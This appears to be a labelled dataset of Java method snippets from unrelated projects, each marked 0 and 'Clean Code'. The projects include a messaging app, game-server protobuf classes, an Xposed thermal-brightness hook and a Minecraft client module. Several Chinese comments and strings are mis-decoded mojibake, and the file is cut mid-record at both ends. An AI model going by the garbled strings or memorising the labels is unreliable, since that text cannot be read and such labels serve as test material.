        if (wallpaper.settings != null && chatBackgroundDrawable.wallpaper.settings != null && wallpaper.settings.intensity > 0) {
          if (chatBackgroundDrawable.themeIsDark == themeIsDark) {
            return chatBackgroundDrawable;
          }
        }
 else {
          return chatBackgroundDrawable;
        }
      }
    }
 else     if (wallpaper.id == chatBackgroundDrawable.wallpaper.id && TextUtils.equals(hash(wallpaper.settings),hash(chatBackgroundDrawable.wallpaper.settings))) {
      if (wallpaper.document != null && !wallpaper.pattern && wallpaper.settings != null && wallpaper.settings.intensity > 0) {
        if (chatBackgroundDrawable.themeIsDark == themeIsDark) {
          return chatBackgroundDrawable;
        }
      }
 else {
        return chatBackgroundDrawable;
      }
    }
  }
  return new ChatBackgroundDrawable(wallpaper,themeIsDark,false);
}",0,Clean Code
"@Override public void mouseClicked(final MouseEvent event){
  if (event.getButton() == MouseEvent.BUTTON1 && event.getClickCount() == 2) {
    handleDoubleClick(getSelectionIndex(event));
  }
}",0,Clean Code
"private int hashCodeForArray(Object array){
  if (array instanceof boolean[]) {
    return Arrays.hashCode((boolean[])array);
  }
  if (array instanceof byte[]) {
    return Arrays.hashCode((byte[])array);
  }
  if (array instanceof char[]) {
    return Arrays.hashCode((char[])array);
  }
  if (array instanceof double[]) {
    return Arrays.hashCode((double[])array);
  }
  if (array instanceof float[]) {
    return Arrays.hashCode((float[])array);
  }
  if (array instanceof int[]) {
    return Arrays.hashCode((int[])array);
  }
  if (array instanceof long[]) {
    return Arrays.hashCode((long[])array);
  }
  if (array instanceof short[]) {
    return Arrays.hashCode((short[])array);
  }
  return Arrays.hashCode((Object[])array);
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof GetChallengeScRsp)) {
    return false;
  }
  GetChallengeScRsp other=(GetChallengeScRsp)o;
  return bitField0_ == other.bitField0_ && (!hasRetcode() || retcode == other.retcode) && (!hasChallengeRewardList() || challengeRewardList.equals(other.challengeRewardList)) && (!hasChallengeList() || challengeList.equals(other.challengeList));
}",0,Clean Code
"/** 
 * 妫�鏌ヤ慨鏀规槸鍚︽湁鏁�
 * @param folder 鏂囦欢澶�
 */
private void updateParamValid(FolderEntity folder){
  XzException404.throwBy(folder.getId() == null,""ID涓嶅緱涓虹┖"");
  XzException400.throwBy(folder.getId().equals(folder.getPid()),""涓婄骇鏂囦欢澶逛笉鑳芥槸鑷繁"");
}",0,Clean Code
"private RogueSeasonInfo(){
}
",0,Clean Code
"/** 
 * 鑾峰彇涓嬩釜瀹℃牳璁板綍
 * @param record
 * @return
 */
FlowDataDealRecord getNext(FlowDataDealRecord record);
",0,Clean Code
"protected void beforeShow(){
  preShow=true;
  dismissAnimFlag=false;
  setOwnActivity(getTopActivity());
  if (getOwnActivity() == null) {
    init(null);
    if (getOwnActivity() == null) {
      error(""DialogX 鏈垵濮嬪寲(E5)銆俓n璇锋鏌ユ槸鍚﹀湪鍚姩瀵硅瘽妗嗗墠杩涜鍒濆鍖栨搷浣滐紝浣跨敤浠ヤ笅浠ｇ爜杩涜鍒濆鍖栵細\nDialogX.init(context);\n\n鍙﹀寤鸿鎮ㄥ墠寰鏌ョ湅 DialogX 鐨勬枃妗ｈ繘琛屼娇鐢細https://github.com/kongzue/DialogX"");
      return;
    }
  }
  if (style.styleVer != DialogXStyle.styleVer) {
    error(""DialogX 鎵寮曠敤鐨 Style 涓嶇鍚堝綋鍓嶉傜敤鐗堟湰锛"" + DialogXStyle.styleVer + "" 寮曞叆鐨 Style(""+ style.getClass().getSimpleName()+ "") 鐗堟湰""+ style.styleVer);
  }
  if (dialogImplMode != DialogX.IMPL_MODE.VIEW && getOwnActivity() instanceof LifecycleOwner) {
    Lifecycle lifecycle=((LifecycleOwner)getOwnActivity()).getLifecycle();
    lifecycle.addObserver(new LifecycleEventObserver(){
      @Override public void onStateChanged(      @NonNull LifecycleOwner source,      @NonNull Lifecycle.Event event){
        if (event == Lifecycle.Event.ON_DESTROY) {
          recycleDialog(getOwnActivity());
        }
      }
    }
);
  }
  if (!(this instanceof NoTouchInterface)) {
    View view=getOwnActivity().getCurrentFocus();
    if (view != null) {
      InputMethodManager imm=(InputMethodManager)getOwnActivity().getSystemService(Context.INPUT_METHOD_SERVICE);
      imm.hideSoftInputFromWindow(view.getWindowToken(),InputMethodManager.HIDE_NOT_ALWAYS);
    }
  }
}",0,Clean Code
"@Override public String signature(@Nullable Object type){
  if (type == null || type instanceof JavaType.Unknown) {
    return ""{undefined}"";
  }
  if (type instanceof JavaType.Class) {
    return classSignature(type);
  }
 else   if (type instanceof JavaType.Array) {
    return arraySignature(type);
  }
 else   if (type instanceof JavaType.Parameterized) {
    return parameterizedSignature(type);
  }
 else   if (type instanceof JavaType.GenericTypeVariable) {
    return genericSignature(type);
  }
 else   if (type instanceof JavaType.Primitive) {
    return primitiveSignature(type);
  }
 else   if (type instanceof JavaType.Method) {
    return methodSignature((JavaType.Method)type);
  }
 else   if (type instanceof JavaType.Variable) {
    return variableSignature((JavaType.Variable)type);
  }
 else   if (type instanceof JavaType.Intersection) {
    return intersectionSignature(type);
  }
  throw new UnsupportedOperationException(""Unexpected type "" + type.getClass().getName());
}
",0,Clean Code
"public boolean isModuleClass(){
  return className.equals(MODULE_CLASS_NAME);
}
",0,Clean Code
"@Override public int hashCode(){
  int result=genericDeclaration != null ? genericDeclaration.hashCode() : 0;
  result=31 * result + (name != null ? name.hashCode() : 0);
  result=31 * result + Arrays.hashCode(upperBounds);
  return result;
}",0,Clean Code
"@Override public SyncChessRogueNousValueScNotify clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  value_.clear();
  return this;
}",0,Clean Code
"private void updateMediaCount(){
  int id=sharedMediaLayout.getClosestTab();
  int[] mediaCount=sharedMediaPreloader.getLastMediaCount();
  if (id < 0 || mediaCount[id] < 0) {
    return;
  }
  if (id == 0) {
    if (sharedMediaLayout.getPhotosVideosTypeFilter() == SharedMediaLayout.FILTER_PHOTOS_ONLY) {
      mediaCounterTextView.setText(LocaleController.formatPluralString(""Photos"",mediaCount[MediaDataController.MEDIA_PHOTOS_ONLY]));
    }
 else     if (sharedMediaLayout.getPhotosVideosTypeFilter() == SharedMediaLayout.FILTER_VIDEOS_ONLY) {
      mediaCounterTextView.setText(LocaleController.formatPluralString(""Videos"",mediaCount[MediaDataController.MEDIA_VIDEOS_ONLY]));
    }
 else {
      mediaCounterTextView.setText(LocaleController.formatPluralString(""Media"",mediaCount[MediaDataController.MEDIA_PHOTOVIDEO]));
    }
  }
 else   if (id == 1) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""Files"",mediaCount[MediaDataController.MEDIA_FILE]));
  }
 else   if (id == 2) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""Voice"",mediaCount[MediaDataController.MEDIA_AUDIO]));
  }
 else   if (id == 3) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""Links"",mediaCount[MediaDataController.MEDIA_URL]));
  }
 else   if (id == 4) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""MusicFiles"",mediaCount[MediaDataController.MEDIA_MUSIC]));
  }
 else   if (id == 5) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""GIFs"",mediaCount[MediaDataController.MEDIA_GIF]));
  }
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)16);
    output.writeUInt32NoTag(uniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)24);
    output.writeUInt32NoTag(mainAffixId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)32);
    output.writeUInt32NoTag(promotion);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    output.writeRawByte((byte)48);
    output.writeUInt32NoTag(itemId);
  }
  if ((bitField0_ & 0x00000010) != 0) {
    output.writeRawByte((byte)56);
    output.writeUInt32NoTag(rank);
  }
  if ((bitField0_ & 0x00000020) != 0) {
    output.writeRawByte((byte)80);
    output.writeUInt32NoTag(level);
  }
  if ((bitField0_ & 0x00000040) != 0) {
    output.writeRawByte((byte)96);
    output.writeUInt32NoTag(num);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.uniqueId,uniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.mainAffixId,mainAffixId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeUInt32(FieldNames.promotion,promotion);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    output.writeUInt32(FieldNames.itemId,itemId);
  }
  if ((bitField0_ & 0x00000010) != 0) {
    output.writeUInt32(FieldNames.rank,rank);
  }
  if ((bitField0_ & 0x00000020) != 0) {
    output.writeUInt32(FieldNames.level,level);
  }
  if ((bitField0_ & 0x00000040) != 0) {
    output.writeUInt32(FieldNames.num,num);
  }
  output.endObject();
}",0,Clean Code
"private void writeLine(final List<TextPosition> textPositionList){
  if (textPositionList.size() > 0) {
    TextLine textLine=this.addNewLine();
    boolean firstCharacterOfLineFound=false;
    for (    TextPosition textPosition : textPositionList) {
      CharacterFactory characterFactory=new CharacterFactory(firstCharacterOfLineFound);
      Character character=characterFactory.createCharacterFromTextPosition(textPosition,this.getPreviousTextPosition());
      textLine.writeCharacterAtIndex(character);
      this.setPreviousTextPosition(textPosition);
      firstCharacterOfLineFound=true;
    }
  }
 else {
    this.addNewLine();
  }
}",0,Clean Code
"/** 
 * <code>optional .NpcRogueInfo rogue_info = 6;</code>
 * @return this
 */
public NpcExtraInfo clearRogueInfo(){
  bitField0_&=~0x00000001;
  rogueInfo.clear();
  return this;
}",0,Clean Code
"/** 
 * Get the promptTokens property: The number of tokens in the provided prompts for the completions request.
 * @return the promptTokens value.
 */
public int getPromptTokens(){
  return this.promptTokens;
}
",0,Clean Code
"@Specialization protected VmList eval(VmList self){
  return self.reverse();
}
@Specialization protected VmList eval(VmSet self){
  return self.reverse();
}
@TruffleBoundary @Specialization protected String eval(String self){
  return new StringBuilder(self).reverse().toString();
}
",0,Clean Code
"public Builder responseFormat(String responseFormat){
  this.responseFormat=responseFormat;
  return this;
}
",0,Clean Code
"ConfigEvaluatorImpl(Evaluator evaluator,ValueMapper mapper){
  this.evaluator=evaluator;
  this.mapper=mapper;
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.SequenceModelProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.SequenceModelProto other=(org.tribuo.protos.core.SequenceModelProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Override public final RogueCommonBuffSelectSource forName(final CharSequence value){
switch (value.length()) {
case 41:
{
      if (ProtoUtil.isEqual(""ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_NONE"",value)) {
        return ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_NONE;
      }
      if (ProtoUtil.isEqual(""ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_AEON"",value)) {
        return ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_AEON;
      }
      break;
    }
case 46:
{
    if (ProtoUtil.isEqual(""ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_DICE_ROLL"",value)) {
      return ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_DICE_ROLL;
    }
    break;
  }
case 48:
{
  if (ProtoUtil.isEqual(""ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_BOARD_EVENT"",value)) {
    return ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_BOARD_EVENT;
  }
  break;
}
case 52:
{
if (ProtoUtil.isEqual(""ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_LEVEL_MECHANISM"",value)) {
  return ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_LEVEL_MECHANISM;
}
break;
}
}
return null;
}",0,Clean Code
"@Override public DoGachaCsReq clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  gachaRandom=0;
  gachaId=0;
  simulateMagic=0;
  gachaNum=0;
  return this;
}",0,Clean Code
"@Override public String getThirdSourceId(){
  return this.mInfo.getThirdSourceId();
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.interop.tensorflow.protos.TensorFlowSequenceModelProto)) {
    return super.equals(obj);
  }
  org.tribuo.interop.tensorflow.protos.TensorFlowSequenceModelProto other=(org.tribuo.interop.tensorflow.protos.TensorFlowSequenceModelProto)obj;
  if (hasMetadata() != other.hasMetadata())   return false;
  if (hasMetadata()) {
    if (!getMetadata().equals(other.getMetadata()))     return false;
  }
  if (!getModelDef().equals(other.getModelDef()))   return false;
  if (!internalGetTensors().equals(other.internalGetTensors()))   return false;
  if (hasFeatureConverter() != other.hasFeatureConverter())   return false;
  if (hasFeatureConverter()) {
    if (!getFeatureConverter().equals(other.getFeatureConverter()))     return false;
  }
  if (hasOutputConverter() != other.hasOutputConverter())   return false;
  if (hasOutputConverter()) {
    if (!getOutputConverter().equals(other.getOutputConverter()))     return false;
  }
  if (!getPredictOp().equals(other.getPredictOp()))   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"private void startCapture(){
  if (captureBuffer == null) {
    captureBuffer=new StringBuilder();
  }
  captureStart=index - 1;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(avatarId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=2;
  }
  return size;
}",0,Clean Code
"@Override public void handle(GameSession session,byte[] data) throws Exception {
  var req=DelMailCsReq.parseFrom(data);
  IntList deleted=session.getPlayer().getMailbox().deleteMail(req.getIdList());
  session.send(new PacketDelMailScRsp(deleted));
}
",0,Clean Code
"@Override public void init(){
  try {
    XposedHelpers.findClass(displayPowerControllerImpl,lpparam.classLoader);
    findAndHookConstructor(displayPowerControllerImpl,new MethodHook(){
      @Override protected void after(      MethodHookParam param){
        setDeclaredField(param,""SUPPORT_TEMEPERATURE_CONTROL"",false);
        setDeclaredField(param,""mThermalBrightnessControlAvailable"",false);
        setDeclaredField(param,""mApplyThermalBrightnessRate"",false);
      }
    }
);
  }
 catch (  XposedHelpers.ClassNotFoundError e) {
    logE(TAG,""android"",""No found class: "" + e);
  }
  try {
    XposedHelpers.findClass(automaticBrightnessControllerImpl,lpparam.classLoader);
    findAndHookConstructor(automaticBrightnessControllerImpl,new MethodHook(){
      @Override protected void after(      MethodHookParam param){
        setDeclaredField(param,""SUPPORT_TEMEPERATURE_CONTROL"",false);
      }
    }
);
  }
 catch (  XposedHelpers.ClassNotFoundError e) {
    logE(TAG,""android"",""No found class: "" + e);
  }
  try {
    findClassIfExists(temperatureController).getDeclaredMethod(""updateTemperature"");
    findAndHookMethod(temperatureController,""updateTemperature"",new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        param.setResult(null);
      }
    }
);
  }
 catch (  NoSuchMethodException e) {
    logE(TAG,""android"",""Don't Have updateTemperature: "" + e);
  }
  try {
    findClassIfExists(displayPowerControllerImpl).getDeclaredMethod(""updateThermalBrightness"",float.class);
    findAndHookMethod(displayPowerControllerImpl,""updateThermalBrightness"",float.class,new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        param.setResult(null);
      }
    }
);
  }
 catch (  NoSuchMethodException e) {
    logE(TAG,""android"",""Don't Have updateThermalBrightness: "" + e);
  }
  try {
    findClassIfExists(thermalBrightnessController).getDeclaredMethod(""updateThermalBrightnessIfNeeded"");
    findAndHookMethod(thermalBrightnessController,""updateThermalBrightnessIfNeeded"",new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        param.setResult(false);
      }
    }
);
  }
 catch (  NoSuchMethodException e) {
    logE(TAG,""android"",""Don't Have updateThermalBrightnessIfNeeded: "" + e);
  }
}
",0,Clean Code
"private float getBreakDamage(Entity entity,boolean checkCrystalAge){
  if (!(entity instanceof EndCrystalEntity))   return 0;
  if (onlyBreakOwn.get() && !placedCrystals.contains(entity.getId()))   return 0;
  if (removed.contains(entity.getId()))   return 0;
  if (attemptedBreaks.get(entity.getId()) > breakAttempts.get())   return 0;
  if (checkCrystalAge && entity.age < ticksExisted.get())   return 0;
  if (isOutOfRange(entity.getPos(),entity.getBlockPos(),false))   return 0;
  blockPos.set(entity.getBlockPos()).move(0,-1,0);
  float selfDamage=DamageUtils.crystalDamage(mc.player,entity.getPos(),predictMovement.get(),blockPos);
  if (selfDamage > maxDamage.get() || (antiSuicide.get() && selfDamage >= EntityUtils.getTotalHealth(mc.player)))   return 0;
  float damage=getDamageToTargets(entity.getPos(),blockPos,true,false);
  boolean shouldFacePlace=shouldFacePlace();
  double minimumDamage=shouldFacePlace ? Math.min(minDamage.get(),1.5d) : minDamage.get();
  if (damage < minimumDamage)   return 0f;
  return damage;
}",0,Clean Code
"/** 
 * 涓�閿鏌ユ墍鏈塻ession鎴栬�卹efresh_token 澶辨晥鍙橀粍 骞舵洿鏂版墍鏈塧ccess_token鍜宻hare_token 骞堕噸鏂扮粍鎴恜ool_token
 * @return
 */
@Log @GetMapping(""updateAllToken"") public Result toUpdateAllToken(){
  try {
    String res=apiService.autoUpdateToken("""");
    if (res.contains(""鐢熸垚Token鎴愬姛"")) {
      try {
        String s=poolService.refreshAllPoolTokens();
        String s1=shareService.refreshAllShareTokens();
        return Result.success(res + s + s1);
      }
 catch (      Exception e) {
        return Result.success(res + ""<br>浣嗘槸鑷姩鏇存柊pool_token鍜宱neApi閲岀殑share_token澶辫触"");
      }
    }
  }
 catch (  Exception e) {
    throw new IllegalStateException(e);
  }
  return Result.error(""鐢熸垚access_token鍜宻hare_token澶辫触"");
}",0,Clean Code
"void visit(OceanBaseTableReference ref);
void visit(OceanBaseConstant constant);
void visit(OceanBaseColumnReference column);
void visit(OceanBaseUnaryPostfixOperation column);
void visit(OceanBaseComputableFunction f);
void visit(OceanBaseBinaryLogicalOperation op);
void visit(OceanBaseSelect select);
void visit(OceanBaseBinaryComparisonOperation op);
void visit(OceanBaseCastOperation op);
void visit(OceanBaseInOperation op);
void visit(OceanBaseOrderByTerm op);
void visit(OceanBaseExists op);
void visit(OceanBaseStringExpression op);
void visit(OceanBaseAggregate aggr);
void visit(OceanBaseColumnName c);
void visit(OceanBaseText fun);
void visit(OceanBaseUnaryPrefixOperation op);
default void visit(OceanBaseExpression expr){
  if (expr instanceof OceanBaseConstant) {
    visit((OceanBaseConstant)expr);
  }
 else   if (expr instanceof OceanBaseColumnReference) {
    visit((OceanBaseColumnReference)expr);
  }
 else   if (expr instanceof OceanBaseUnaryPostfixOperation) {
    visit((OceanBaseUnaryPostfixOperation)expr);
  }
 else   if (expr instanceof OceanBaseComputableFunction) {
    visit((OceanBaseComputableFunction)expr);
  }
 else   if (expr instanceof OceanBaseBinaryLogicalOperation) {
    visit((OceanBaseBinaryLogicalOperation)expr);
  }
 else   if (expr instanceof OceanBaseSelect) {
    visit((OceanBaseSelect)expr);
  }
 else   if (expr instanceof OceanBaseBinaryComparisonOperation) {
    visit((OceanBaseBinaryComparisonOperation)expr);
  }
 else   if (expr instanceof OceanBaseCastOperation) {
    visit((OceanBaseCastOperation)expr);
  }
 else   if (expr instanceof OceanBaseInOperation) {
    visit((OceanBaseInOperation)expr);
  }
 else   if (expr instanceof OceanBaseOrderByTerm) {
    visit((OceanBaseOrderByTerm)expr);
  }
 else   if (expr instanceof OceanBaseExists) {
    visit((OceanBaseExists)expr);
  }
 else   if (expr instanceof OceanBaseStringExpression) {
    visit((OceanBaseStringExpression)expr);
  }
 else   if (expr instanceof OceanBaseTableReference) {
    visit((OceanBaseTableReference)expr);
  }
 else   if (expr instanceof OceanBaseAggregate) {
    visit((OceanBaseAggregate)expr);
  }
 else   if (expr instanceof OceanBaseColumnName) {
    visit((OceanBaseColumnName)expr);
  }
 else   if (expr instanceof OceanBaseText) {
    visit((OceanBaseText)expr);
  }
 else   if (expr instanceof OceanBaseUnaryPrefixOperation) {
    visit((OceanBaseUnaryPrefixOperation)expr);
  }
 else {
    throw new AssertionError(expr);
  }
}
",0,Clean Code
"@Override public Schema getSchema(){
  return schema;
}
",0,Clean Code
"public void onLoad(){
}
",0,Clean Code
"@Override public void onTreeUpdate(){
  super.onTreeUpdate();
  if (mNodeJni == null || mNodeJni instanceof ARNode) {
    return;
  }
  if (mAnchorAttempt != null) {
    mAnchorAttempt.cancel();
  }
  ViewParent parent=getParent();
  if (parent instanceof VRTARScene) {
    if (mAnchor == null) {
      mAnchorAttempt=new AnchorAttempt(this,new Vector(mPosition));
      mAnchorAttempt.makeAttempt();
    }
  }
 else   if (mAnchor != null) {
    if (parent == null || !(parent instanceof VRTARScene)) {
      if (DEBUG_ANCHORING) {
        Log.i(TAG,""Anchored node "" + this + "" is being removed or repurposed, detaching anchor"");
      }
      mAnchor.detach();
      if (mNodeJni != null) {
        mNodeJni.setPosition(new Vector(mPosition));
      }
    }
  }
}
",0,Clean Code
"/** 
 * <code>optional .RogueCommonBuffSelectSource source = 6;</code>
 * @param value the source to set
 * @return this
 */
public RogueBuffSelectInfo setSource(final RogueCommonBuffSelectSourceOuterClass.RogueCommonBuffSelectSource value){
  bitField0_|=0x00000020;
  source=value.getNumber();
  return this;
}",0,Clean Code
"public void setCrossCursor(final boolean cross){
  if (cross) {
    super.setViewCursor(Cursor.getPredefinedCursor(Cursor.MOVE_CURSOR));
  }
 else {
    super.setViewCursor(Cursor.getDefaultCursor());
  }
}
",0,Clean Code
"@Override protected void processElement(SourceRecord element,SourceOutput<T> output,SourceSplitState splitState) throws Exception {
  if (isWatermarkEvent(element)) {
    LOG.debug(""PostgresSourceRecordEmitter Process WatermarkEvent: {}; splitState = {}"",element,splitState);
    Offset watermark=super.getOffsetPosition(element);
    if (isHighWatermarkEvent(element) && splitState.isSnapshotSplitState()) {
      LOG.info(""PostgresSourceRecordEmitter Set HighWatermark {} for {}"",watermark,splitState);
      splitState.asSnapshotSplitState().setHighWatermark(watermark);
    }
  }
 else   if (isSchemaChangeEvent(element) && splitState.isStreamSplitState()) {
    LOG.debug(""PostgresSourceRecordEmitter Process SchemaChangeEvent: {}; splitState = {}"",element,splitState);
    HistoryRecord historyRecord=getHistoryRecord(element);
    Array tableChanges=historyRecord.document().getArray(HistoryRecord.Fields.TABLE_CHANGES);
    TableChanges changes=TABLE_CHANGE_SERIALIZER.deserialize(tableChanges,true);
    for (    TableChanges.TableChange tableChange : changes) {
      splitState.asStreamSplitState().recordSchema(tableChange.getId(),tableChange);
    }
    if (includeSchemaChanges) {
      emitElement(element,output);
    }
  }
 else   if (isDataChangeRecord(element)) {
    LOG.debug(""PostgresSourceRecordEmitter Process DataChangeRecord: {}; splitState = {}"",element,splitState);
    updateStartingOffsetForSplit(splitState,element);
    reportMetrics(element);
    final Map<TableId,TableChange> tableSchemas=splitState.getSourceSplitBase().getTableSchemas();
    final TableChange tableSchema=tableSchemas.getOrDefault(RecordUtils.getTableId(element),null);
    debeziumDeserializationSchema.deserialize(element,new Collector<T>(){
      @Override public void collect(      T record){
        Struct value=(Struct)element.value();
        Struct source=value.getStruct(Envelope.FieldName.SOURCE);
        String dbName=source.getString(AbstractSourceInfo.DATABASE_NAME_KEY);
        String schemaName=source.getString(AbstractSourceInfo.SCHEMA_NAME_KEY);
        String tableName=source.getString(AbstractSourceInfo.TABLE_NAME_KEY);
        sourceReaderMetrics.outputMetrics(dbName,schemaName,tableName,splitState.isSnapshotSplitState(),value);
        output.collect(record);
      }
      @Override public void close(){
      }
    }
,tableSchema);
  }
 else   if (isHeartbeatEvent(element)) {
    LOG.debug(""PostgresSourceRecordEmitterProcess Heartbeat: {}; splitState = {}"",element,splitState);
    updateStartingOffsetForSplit(splitState,element);
  }
 else {
    LOG.info(""Meet unknown element {} for splitState = {}, just skip."",element,splitState);
  }
}
",0,Clean Code
"@Override public J visitMethodInvocation(J.MethodInvocation method,ExecutionContext ctx){
  J.MethodInvocation m=(J.MethodInvocation)super.visitMethodInvocation(method,ctx);
  if (!dependencyDsl.matches(m) || !(StringUtils.isBlank(configuration) || m.getSimpleName().equals(configuration))) {
    return m;
  }
  List<Expression> depArgs=m.getArguments();
  if (depArgs.get(0) instanceof J.Literal) {
    String gav=(String)((J.Literal)depArgs.get(0)).getValue();
    if (gav != null) {
      Dependency dependency=DependencyStringNotationConverter.parse(gav);
      if (!newExtension.equals(dependency.getExt()) && ((dependency.getVersion() == null && depMatcher.matches(dependency.getGroupId(),dependency.getArtifactId())) || (dependency.getVersion() != null && depMatcher.matches(dependency.getGroupId(),dependency.getArtifactId(),dependency.getVersion())))) {
        Dependency newDependency=dependency.withExt(newExtension);
        m=m.withArguments(ListUtils.mapFirst(m.getArguments(),arg -> ChangeStringLiteral.withStringValue((J.Literal)arg,newDependency.toStringNotation())));
      }
    }
  }
 else   if (depArgs.get(0) instanceof G.MapEntry) {
    G.MapEntry extensionEntry=null;
    String groupId=null;
    String artifactId=null;
    String version=null;
    String extension=null;
    String extensionStringDelimiter=""'"";
    for (    Expression e : depArgs) {
      if (!(e instanceof G.MapEntry)) {
        continue;
      }
      G.MapEntry arg=(G.MapEntry)e;
      if (!(arg.getKey() instanceof J.Literal) || !(arg.getValue() instanceof J.Literal)) {
        continue;
      }
      J.Literal key=(J.Literal)arg.getKey();
      J.Literal value=(J.Literal)arg.getValue();
      if (!(key.getValue() instanceof String) || !(value.getValue() instanceof String)) {
        continue;
      }
      String keyValue=(String)key.getValue();
      String valueValue=(String)value.getValue();
      if (""group"".equals(keyValue)) {
        groupId=valueValue;
      }
 else       if (""name"".equals(keyValue)) {
        artifactId=valueValue;
      }
 else       if (""version"".equals(keyValue)) {
        version=valueValue;
      }
 else       if (""ext"".equals(keyValue) && !newExtension.equals(valueValue)) {
        if (value.getValueSource() != null) {
          extensionStringDelimiter=value.getValueSource().substring(0,value.getValueSource().indexOf(valueValue));
        }
        extensionEntry=arg;
        extension=valueValue;
      }
    }
    if (groupId == null || artifactId == null || (version == null && !depMatcher.matches(groupId,artifactId)) || (version != null && !depMatcher.matches(groupId,artifactId,version)) || extension == null) {
      return m;
    }
    String delimiter=extensionStringDelimiter;
    G.MapEntry finalExtension=extensionEntry;
    m=m.withArguments(ListUtils.map(m.getArguments(),arg -> {
      if (arg == finalExtension) {
        return finalExtension.withValue(((J.Literal)finalExtension.getValue()).withValue(newExtension).withValueSource(delimiter + newExtension + delimiter));
      }
      return arg;
    }
));
  }
  return m;
}",0,Clean Code
"private void getSelectionPath(Layout layout,int start,int end){
  if (start == end) {
    return;
  }
  if (end < start) {
    int temp=end;
    end=start;
    start=temp;
  }
  final int startline=layout.getLineForOffset(start);
  final int endline=layout.getLineForOffset(end);
  for (int line=startline; line <= endline; ++line) {
    final int lineStart=layout.getLineStart(line);
    final int lineEnd=layout.getLineEnd(line);
    if (lineEnd == lineStart)     continue;
    if (lineStart + 1 == lineEnd && Character.isWhitespace(layout.getText().charAt(lineStart)))     continue;
    final float left, right;
    if (line == startline && start > lineStart) {
      left=layout.getPrimaryHorizontal(start);
    }
 else {
      left=layout.getLineLeft(line);
    }
    if (line == endline && end < lineEnd) {
      right=layout.getPrimaryHorizontal(end);
    }
 else {
      right=layout.getLineRight(line);
    }
    addRect(Math.min(left,right),layout.getLineTop(line),Math.max(left,right),layout.getLineBottom(line));
  }
}",0,Clean Code
"public static ChessRogueStartScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new ChessRogueStartScRsp(),data).checkInitialized();
}
public static ChessRogueStartScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ChessRogueStartScRsp(),input).checkInitialized();
}
public static ChessRogueStartScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ChessRogueStartScRsp(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * 鎸戦�夊綋鍓嶆満鍣ㄩ渶瑕佹墽琛岀殑浠诲姟
 * @param allTaskList 鎵�鏈夌殑浠诲姟
 * @return 闇�瑕佹墽琛岀殑浠诲姟
 */
private List<E> selectTask(List<E> allTaskList,List<String> allWorkCodes,String currentWorkerCode){
  if (ValidateUtils.isEmptyList(allTaskList)) {
    return new ArrayList<>();
  }
  if (ValidateUtils.isEmptyList(allWorkCodes) || ValidateUtils.isBlank(currentWorkerCode)) {
    LOGGER.warn(""task running, but without registrant, and so scheduled tasks can't execute, taskName:{}."",taskName);
    return new ArrayList<>();
  }
  Collections.sort(allTaskList);
  Collections.sort(allWorkCodes);
  int idx=0;
  while (idx < allWorkCodes.size()) {
    if (allWorkCodes.get(idx).equals(currentWorkerCode)) {
      break;
    }
    idx+=1;
  }
  if (idx == allWorkCodes.size()) {
    LOGGER.debug(""task running, registrants not conclude present machine, taskName:{}."",taskName);
    return new ArrayList<>();
  }
  int count=allTaskList.size() / allWorkCodes.size();
  if (allTaskList.size() % allWorkCodes.size() != 0) {
    count+=1;
  }
  if (idx * count >= allTaskList.size()) {
    return new ArrayList<>();
  }
  return allTaskList.subList(idx * count,Math.min(idx * count + count,allTaskList.size()));
}",0,Clean Code
"/** 
